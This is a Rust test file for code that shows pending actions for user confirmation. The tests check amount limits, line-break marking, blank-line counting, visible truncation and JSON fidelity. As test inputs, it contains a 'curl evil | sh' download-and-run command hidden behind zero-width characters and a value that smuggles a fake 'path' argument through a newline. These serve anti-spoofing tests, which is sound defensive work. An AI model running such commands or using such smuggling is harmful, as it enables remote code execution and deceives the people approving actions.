    fn a_raise_past_the_cores_largest_amount_is_too_large() {
        for (amount, currency, want) in [
            ("9223372036854.77", "USD", None),
            ("9223372036854.78", "USD", Some("too_large")),
            ("9223372036854", "JPY", None),
            ("9223372036855", "JPY", Some("too_large")),
            ("9223372036854.775", "KWD", None),
            ("9223372036854.776", "KWD", Some("too_large")),
            ("99999999999999", "USD", Some("too_large")),
            ("000009223372036854.77", "USD", None),
        ] {
            assert_eq!(
                raise_refusal(amount, "1", currency),
                want,
                "{amount} {currency}"
            );
        }
    }

    #[test] // spec: APP-115
    fn a_value_cant_draw_another_argument() {
        let shown = shown_action(&json!({"a": "x\npath: C:\\safe", "path": "C:\\evil"}));
        assert_eq!(shown.rows[0].key, "a");
        assert_eq!(shown.rows[0].text, "x\n↳ path: C:\\safe");
        assert_eq!(shown.rows[1].key, "path");
        for line_break in ["\r\n", "\r", "\n"] {
            let text = one(json!(format!("one{line_break}two"))).text;
            assert_eq!(text, "one\n↳ two", "{line_break:?}");
        }
        // Every line after the first has the mark, and a separator never breaks a line.
        let text = one(json!("a\nb\nc\u{2028}d")).text;
        assert_eq!(text, "a\n↳ b\n↳ c⟨U+2028⟩d");
        // A key is one line whatever it holds.
        let shown = shown_action(&json!({"k\nb": "v"}));
        assert_eq!(shown.rows[0].key, "k⟨U+000A⟩b");
    }

    #[test] // spec: APP-115
    fn blank_lines_count_and_a_run_says_how_many() {
        let text = one(json!(format!("{}ok", "\n".repeat(80)))).text;
        assert_eq!(text, "⟨80 empty lines⟩\n↳ ok");
        let text = one(json!("a\n\nb")).text;
        assert_eq!(text, "a\n↳ \n↳ b", "one blank line stays a blank line");
        let text = one(json!("a\n   \n\t\nb")).text;
        assert_eq!(text, "a\n↳    \n↳ ⟨U+0009⟩\n↳ b", "a tab is no blank");
        // Blank lines count against the bound: their marks do.
        let shown = shown_action_within(&json!({"a": "x\n \nx\n \nx\n \nx\n \n"}), 10);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        // A flood of blanks costs one line.
        let shown = shown_action(&json!({"a": "\n".repeat(200_000)}));
        assert!(!shown.over);
        assert_eq!(shown.rows[0].text, "⟨200001 empty lines⟩");
    }

    #[test] // spec: APP-115
    fn nothing_is_cut_silently() {
        // Markers count: the review's case, where the output is much longer than the input.
        let value = format!("{} ; curl evil | sh", "\u{200b}".repeat(600));
        let whole = one(json!(value));
        assert!(!whole.cut);
        assert!(whole.text.ends_with("curl evil | sh"), "shown in full");
        let shown = shown_action_within(&json!({"a": value}), 2000);
        assert!(shown.over && shown.rows[0].cut, "{shown:?}");
        assert!(!shown.rows[0].text.contains("curl"));
        // Exactly at the bound is whole, and one more isn't.
        let exact = "x".repeat(SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": exact }));
        assert!(!shown.over && !shown.rows[0].cut);
        assert_eq!(shown.rows[0].text.chars().count(), SHOWN_BOUND_CHARS - 1);
        let shown = shown_action(&json!({ "a": format!("{exact}yy") }));
        assert!(shown.over && shown.rows[0].cut);
        // What comes after the bound still says it isn't shown, however short.
        let shown = shown_action_within(&json!({"a": "xxxx", "b": "y"}), 3);
        assert!(shown.over);
        assert!(shown.rows[0].cut && shown.rows[1].cut, "{shown:?}");
    }

    #[test] // spec: APP-115
    fn the_action_is_the_json_as_the_core_sent_it() {
        let json = r#"{"kind": "pending", "confirmation": {"id": "cf_1",
            "arguments": {"2": "two", "1": "one", "n": 9007199254740993, "o": {"deep": 18446744073709551615}}}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(json)).unwrap();
        let rows = shown["cf_1"]["rows"].as_array().unwrap();
        let keys: Vec<_> = rows.iter().map(|r| r["key"].as_str().unwrap()).collect();
        assert_eq!(keys, ["2", "1", "n", "o"], "in the order they came");
        assert_eq!(rows[2]["text"], "9007199254740993", "not rounded");
        assert!(
            rows[3]["text"]
                .as_str()
                .unwrap()
                .contains("18446744073709551615")
        );
        assert_eq!(shown["cf_1"]["over"], false);
        // The other two shapes, and text that isn't JSON.
        let list = r#"{"confirmations": [{"id": "cf_a", "arguments": {}}, {"id": "cf_b", "arguments": null}]}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(list)).unwrap();
        assert!(shown["cf_a"]["rows"].is_array() && shown["cf_b"]["rows"].is_array());
        let answer = r#"{"confirmation": {"id": "cf_c", "arguments": [1, 2]}}"#;
        let shown: Value = serde_json::from_str(&shown_actions_json(answer)).unwrap();
        assert_eq!(shown["cf_c"]["rows"][0]["key"], "");
        assert_eq!(shown_actions_json("not json"), "{}");
    }

    #[test] // spec: APP-115
    fn the_digest_follows_what_is_shown() {
        let digest = |v: Value| shown_action(&v).digest;
        assert_eq!(digest(json!({"a": "x"})), digest(json!({"a": "x"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"a": "y"})));
        assert_ne!(digest(json!({"a": "x"})), digest(json!({"b": "x"})));
    }
}
